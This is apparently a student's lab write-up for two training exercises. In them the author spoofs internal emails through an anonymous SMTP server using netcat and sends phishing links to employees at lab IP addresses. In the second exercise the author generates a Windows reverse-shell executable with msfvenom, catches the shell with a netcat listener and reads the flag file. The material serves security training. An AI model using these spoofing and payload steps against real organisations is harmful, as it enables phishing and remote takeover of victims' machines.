
# 13.3.7.4
On the target VM #1 enumerate the victim's company website and identify the person working in HR.  
The objective of this challenge is to mount a social engineering attack against HR.  
The victim machine is running an SMTP server that can be used to send company emails.  
The SMTP server allows anonymous logins. Research how to interact with the SMTP server using Netcat.  
Then, send a phishing email to the HR employee that contains keywords "job application".  
Include a link to the attacker's webserver in the email body. Once the victim clicks on the malicious link,  
capture the browser's user-agent string. The flag is contained within the user-agent string.

Enum:
```bash
nmap -Pn 192.168.231.55  
  
PORT     STATE SERVICE  
25/tcp   open  smtp  
8080/tcp open  http-proxy
```

Find people & email   192168.231.55:8080 :

| Owen Lynch    | Layla Hale   | Tony Harper       | Ross Murray    |
| ------------- | ------------ | ----------------- | -------------- |
| CEO           | HR           | Sales & Contracts | IT Support\    |
| olynch@victim | lhale@victim | tharper@victim    | rmurray@victim |
| 202-555-0188  | 202-555-0182 | 202-555-0190      | 202-555-1051   |

Connect to SMTP & email:
```bash
nc -C 192.168.231.55 25  
  
220 VICTIM Microsoft ESMTP MAIL Service, Version: 10.0.17763.1697 ready at  Fri, 9 Dec 2022 20:22:22 -0500  
  
HELO  
  
250 VICTIM Hello [192.168.119.231]  
  
MAIL FROM: tharper@victim  
  
250 2.1.0 tharper@victim....Sender OK  
  
RCPT TO: lhale@victim  
  
250 2.1.5 lhale@victim   
  
DATA  
  
354 Start mail input; end with <CRLF>.<CRLF>  
  
Subject: job application  
job application  
http://192.168.119.231/index.html  
.  
  
250 2.6.0 <VICTIM8CQ9d7vvktTP400000005@VICTIM> Queued mail for delivery  
  
QUIT
```


# 13.3.7.5
On the target VM #2 enumerate the victim's company website and identify employees working in IT and Sales departments.  
The objective of this challenge is to mount a social engineering attack against the person in sales.  
The victim machine is running an SMTP server that can be used to send company emails. The SMTP server allows anonymous logins.  
Research how to interact with the SMTP server using Netcat. Then, send a phishing email **from the IT person** **to the employee in sales** that contains keywords **"urgent" and "patch"**.  
Create and host a **Windows PE payload** (_.exe_ executable) and include a link to it in the email body.  
If your email is sent as instructed, the victim user will open it, click on the link, download the malicious executable, and run it.  
Once you have obtained a reverse shell, retrieve the flag located on the Administrator user's desktop.

So, similar approach to above only using **msfvenom** for the payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.231 LPORT=4444 -f exe -o patch.exe
```
	Same ppl as above  
  
Start **nc** listener on the port ^  
  
Connect to SMTP & email:
```bash
220 VICTIM Microsoft ESMTP MAIL Service, Version: 10.0.17763.1697 ready at  Fri, 9 Dec 2022 20:40:00 -0500   
  
HELO  
  
250 VICTIM Hello [192.168.119.231]  
  
MAIL FROM: rmurray@victim  
  
250 2.1.0 rmurray@victim....Sender OK  
  
RCPT TO: tharper@victim  
  
250 2.1.5 tharper@victim   
  
DATA  
  
354 Start mail input; end with <CRLF>.<CRLF>  
  
Subject: urgent patch  
urgent patch  
http://192.168.119.231/patch.exe  
.  
  
250 2.6.0 <VICTIMFRaqbC8wSA1Xv00000002@VICTIM> Queued mail for delivery  
  
QUIT  
  
221 2.0.0 VICTIM Service closing transmission channel
```

Once rev-shell's connected:
```powershell
type C:\Users\Administrator\Desktop\flag.txt
```
